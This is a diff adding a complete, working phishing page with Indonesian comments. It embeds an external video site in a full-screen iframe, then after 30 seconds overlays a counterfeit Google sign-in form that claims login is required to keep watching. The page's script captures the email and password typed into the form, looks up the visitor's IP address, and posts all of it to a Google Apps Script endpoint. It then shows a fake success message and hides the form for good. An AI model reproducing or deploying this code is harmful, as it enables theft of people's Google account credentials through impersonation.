@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masuk untuk Lanjut</title>
+    <style>
+        body {
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif; /* Font mirip Google */
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            overflow: hidden; /* Mencegah scroll pada body jika iframe full-screen */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Iframe full-screen */
+        .fullscreen-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw; /* Lebar viewport penuh */
+            height: 100vh; /* Tinggi viewport penuh */
+            border: none; /* Hapus border default iframe */
+            z-index: 1; /* Pastikan di bawah overlay dan form */
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 24px; /* Padding sedikit disesuaikan */
+            border-radius: 8px;
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,.3), 0 4px 8px 3px rgba(60,64,67,.15); /* Box shadow mirip Google */
+            width: 360px; /* Lebar form standar Google */
+            text-align: center;
+            /* Posisi melayang */
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1000; /* Pastikan di atas konten lain */
+            display: none; /* Sembunyikan secara default */
+            opacity: 0; /* Untuk animasi fade-in */
+            transition: opacity 0.5s ease-in-out;
+            box-sizing: border-box; /* Pastikan padding tidak menambah lebar */
+        }
+        .login-container.show {
+            display: block;
+            opacity: 1;
+        }
+
+        /* Overlay untuk memblokir interaksi dengan background */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999; /* Di bawah form, di atas iframe */
+            display: none; /* Sembunyikan secara default */
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+        .overlay.show {
+            display: block;
+            opacity: 1;
+        }
+
+        .google-logo {
+            width: 75px;
+            margin-bottom: 20px; /* Jarak bawah logo */
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: normal; /* Normal font-weight untuk judul utama */
+            line-height: 1.3333;
+            margin-bottom: 0; /* Sesuaikan margin */
+            color: #202124;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            line-height: 1.5;
+            margin-top: 8px; /* Jarak atas sub-judul */
+            margin-bottom: 24px;
+            color: #202124;
+        }
+
+        .input-group {
+            margin-bottom: 16px; /* Jarak antar input group */
+            position: relative;
+        }
+
+        .input-group input[type="text"],
+        .input-group input[type="password"] {
+            width: 100%;
+            padding: 15px 14px; /* Padding sedikit lebih besar */
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+            color: #202124;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 1px 1px 0 rgba(66,133,244,0.15); /* Shadow fokus Google */
+        }
+
+        /* Placeholder float/label animasi */
+        .input-group label {
+            position: absolute;
+            left: 14px;
+            top: 15px;
+            color: #80868b;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            background-color: transparent; /* Pastikan tidak ada background */
+            padding: 0 4px; /* Padding untuk "mengambang" */
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -9px; /* Pindah ke atas */
+            font-size: 12px;
+            color: #1a73e8;
+            background-color: #fff;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: flex-end; /* Tombol ke kanan */
+            align-items: center;
+            margin-top: 28px; /* Jarak atas untuk tombol */
+        }
+
+        button {
+            padding: 10px 24px; /* Padding tombol disesuaikan */
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px; /* Ukuran font tombol */
+            font-weight: 500; /* Medium weight */
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            min-width: 88px; /* Ukuran minimum tombol Google */
+        }
+        button:hover {
+            background-color: #1669c2;
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,.3), 0 1px 2px 0 rgba(60,64,67,.15);
+        }
+        button:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(66,133,244,0.4);
+        }
+
+        #message {
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Iframe full-screen sebagai background -->
+    <iframe src="https://24av.net/" class="fullscreen-iframe" allowfullscreen></iframe>
+
+    <div class="overlay" id="formOverlay"></div>
+    <div class="login-container" id="loginFormContainer">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        <h2>Masuk</h2>
+        <p class="subtitle">Untuk akses full web/lanjut nonton</p>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="email" name="email" placeholder=" " required>
+                <label for="email">Email atau ponsel</label>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder=" " required>
+                <label for="password">Kata sandi</label>
+            </div>
+            <div class="actions">
+                <button type="submit">Berikutnya</button>
+            </div>
+        </form>
+        <p id="message"></p>
+    </div>
+
+    <script>
+        const FORM_DISPLAYED_KEY = 'formFilledSuccessfully'; // Kunci untuk localStorage
+        const delayTime = 30000; // 30 detik
+
+        const loginFormContainer = document.getElementById('loginFormContainer');
+        const formOverlay = document.getElementById('formOverlay');
+        const loginForm = document.getElementById('loginForm');
+        const messageElement = document.getElementById('message');
+
+        // Fungsi untuk menampilkan form
+        function showForm() {
+            formOverlay.classList.add('show');
+            loginFormContainer.classList.add('show');
+        }
+
+        // Fungsi untuk menyembunyikan form
+        function hideForm() {
+            formOverlay.classList.remove('show');
+            loginFormContainer.classList.remove('show');
+            // Tunggu transisi selesai sebelum menyembunyikan display secara total
+            setTimeout(() => {
+                formOverlay.style.display = 'none';
+                loginFormContainer.style.display = 'none';
+            }, 500); // Sesuaikan dengan durasi transisi CSS
+        }
+
+        // Cek apakah form sudah pernah diisi
+        if (localStorage.getItem(FORM_DISPLAYED_KEY) === 'true') {
+            console.log("Form sudah pernah diisi dengan benar. Tidak akan ditampilkan.");
+        } else {
+            // Jika belum, tampilkan form setelah delay
+            setTimeout(() => {
+                showForm();
+            }, delayTime);
+        }
+
+        loginForm.addEventListener('submit', async function(event) {
+            event.preventDefault(); // Mencegah pengiriman formulir standar
+
+            const form = event.target;
+            const formData = new FormData(form);
+            const data = Object.fromEntries(formData.entries());
+
+            // Mendapatkan IP Address
+            let ipAddress = 'Unknown';
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (error) {
+                console.error("Gagal mendapatkan IP dari api.ipify.org:", error);
+            }
+            data.ipAddress = ipAddress;
+
+            // Ganti URL ini dengan Web app URL yang Anda dapatkan dari Google Apps Script
+            const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbypaOWC7L1Tos4ztfJ0Quo1cYdUm26e1Nwy5Gtcnn6BKzbYAYnZMILWyFDLsM067RManQ/exec'; // <--- GANTI INI!
+
+            try {
+                const response = await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams(data).toString()
+                });
+
+                messageElement.textContent = 'Berhasil login.';
+                messageElement.style.color = 'green';
+                form.reset(); // Kosongkan formulir setelah pengiriman
+
+                // Simpan status di localStorage agar form tidak muncul lagi
+                localStorage.setItem(FORM_DISPLAYED_KEY, 'true');
+
+                // Sembunyikan form setelah beberapa saat
+                setTimeout(() => {
+                    hideForm();
+                }, 2000); // Sembunyikan setelah 2 detik
+            } catch (error) {
+                console.error('Error sending data:', error);
+                messageElement.textContent = 'Gagal login. Silakan coba lagi.';
+                messageElement.style.color = 'red';
+            }
+        });
+    </script>
+</body>
+</html>
